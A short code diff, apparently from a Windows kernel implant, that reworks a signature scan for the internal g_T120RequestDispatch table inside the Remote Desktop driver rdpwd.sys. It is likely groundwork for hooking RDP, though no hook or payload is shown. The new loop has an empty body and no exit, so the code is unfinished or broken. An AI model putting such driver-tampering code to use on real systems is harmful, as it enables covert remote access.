@@ -47,19 +47,22 @@ INT WindowsEntrypoint()
   {
     LPVOID           *ReqTbl = NULL;
     LPVOID            SecEnd = NULL;
+    SIZE_T            SecLen = 0;
 
-    SecEnd = GetPeSect(Drvs.RdpwdBase, HASH_TEXT);
-    ReqTbl = GetPeSect(Drvs.RdpwdBase, HASH_RDATA);
-    
-    // Signature: Searches for the Remote Desktop Protocol
-    // (rdpwd.sys) signature for g_T120RequestDispatch Table.
-    if ( (PTR(Drvs.RdpwdBase) < PTR(ReqTbl[0]) < PTR(SecEnd)) &&
-         (PTR(Drvs.RdpwdBase) < PTR(ReqTbl[1]) < PTR(SecEnd)) &&
-	 (PTR(ReqTbl[2]) != PTR(ReqTbl[3]))                   &&
-	 (PTR(ReqTbl[4]) == PTR(ReqTbl[5]))                   &&
-	 (PTR(ReqTbl[6]) == PTR(NULL)) )
-    {
+    SecEnd = GetPeSect(Drvs.RdpwdBase, HASH_TEXT, &SecLen);
+    SecEnd = (LPVOID)(PTR(SecEnd) + SecLen);
+    ReqTbl = GetPeSect(Drvs.RdpwdBase, HASH_RDATA, NULL);
 
+    for ( ; ; ReqTbl++ ) {
+      if ( (PTR(Drvs.RdpwdBase) < PTR(ReqTbl[0])) &&
+	   (PTR(ReqTbl[0])      < PTR(SecEnd))    &&
+	   (PTR(Drvs.RdpwdBase) < PTR(ReqTbl[1])) &&
+	   (PTR(ReqTbl[1])      < PTR(SecEnd))    &&
+	   (PTR(ReqTbl[2])     != PTR(ReqTbl[3])) &&
+	   (PTR(ReqTbl[4])     == PTR(ReqTbl[5])) &&
+	   (PTR(ReqTbl[6])     == PTR(NULL)) )
+      {
+      };
     };
   };
 
